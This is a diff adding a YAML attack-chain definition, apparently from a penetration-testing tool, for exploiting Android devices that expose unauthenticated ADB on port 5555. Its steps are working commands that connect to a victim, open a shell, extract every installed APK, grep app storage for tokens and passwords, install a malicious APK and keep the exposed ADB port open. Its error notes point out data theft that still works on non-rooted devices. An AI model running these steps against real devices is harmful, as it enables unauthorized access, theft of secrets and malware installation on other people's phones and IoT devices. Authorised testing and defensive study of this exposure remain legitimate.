@@ -1,0 +1,76 @@
+chain_id: adb_network_unauth
+title: "Android Debug Bridge — TCP 5555 unauth shell on rooted/dev devices"
+severity: HIGH
+tags: [adb, android, mobile, unauth, shell, iot]
+
+trigger:
+  any_of:
+    - { kind: "adb_network_open" }
+    - { service_pattern: "(?i)adb|android.*debug" }
+    - { banner_pattern: "(?i)adb|android" }
+    - { port_in: [5555, 5037, 5554] }
+
+description: |
+  Android devices with developer mode + "ADB over network" enabled
+  (or rooted with `setprop service.adb.tcp.port 5555`) accept
+  unauthenticated shell connections from anyone who reaches port
+  5555. Common on Android TV boxes, IoT gateways, dev phones left
+  on Wi-Fi, badly-secured industrial tablets. Result: app install,
+  package extraction, full filesystem in 30 seconds.
+
+steps:
+  - id: 1
+    title: "Confirm ADB on the network"
+    command: |
+      nmap -p 5555 -sV $VICTIMA
+      apt install -y adb
+      adb connect $VICTIMA:5555
+
+  - id: 2
+    title: "Spawn a shell"
+    command: |
+      adb -s $VICTIMA:5555 shell
+      # In the device shell:
+      id; uname -a; getprop ro.product.model; pm list packages
+
+  - id: 3
+    title: "Pull every installed APK"
+    command: |
+      for pkg in $(adb -s $VICTIMA:5555 shell pm list packages | sed 's/^package://' | tr -d '\\r'); do
+        path=$(adb -s $VICTIMA:5555 shell pm path "$pkg" | sed 's/^package://' | tr -d '\\r')
+        adb -s $VICTIMA:5555 pull "$path" "${pkg}.apk"
+      done
+
+  - id: 4
+    title: "Search for tokens and stored secrets"
+    command: |
+      adb -s $VICTIMA:5555 shell 'cat /data/data/*/shared_prefs/*.xml' 2>/dev/null | grep -Ei 'token|secret|password|apikey'
+      adb -s $VICTIMA:5555 shell 'find /sdcard -name "*.json" -exec grep -lE "token|secret" {} \\;'
+
+  - id: 5
+    title: "Drop a payload (root devices only)"
+    command: |
+      adb -s $VICTIMA:5555 push /tmp/malicious.apk /data/local/tmp/
+      adb -s $VICTIMA:5555 shell pm install /data/local/tmp/malicious.apk
+      adb -s $VICTIMA:5555 shell am start -n com.attacker.app/.MainActivity
+
+  - id: 6
+    title: "Persistence — drop a keep-alive ADB tunnel"
+    command: |
+      adb -s $VICTIMA:5555 shell 'su -c "setprop persist.service.adb.tcp.port 5555 && stop adbd && start adbd"'
+
+common_errors:
+  - error: "adb connect: 'failed to connect: Connection refused'"
+    solution: |
+      Default Android disables ADB over TCP after reboot. Check 5037
+      (host-side ADB server) which is sometimes accidentally bound to
+      0.0.0.0 by dev tools. If filtered, this chain is dead.
+  - error: "shell drops but `su` fails"
+    solution: |
+      Non-rooted device. You still get the `shell` user — useful for
+      data theft (everything in /sdcard, app shared_prefs, Telegram
+      cache) but not full RCE.
+
+references:
+  - https://developer.android.com/studio/command-line/adb
+  - https://book.hacktricks.xyz/network-services-pentesting/5555-android-debug-bridge
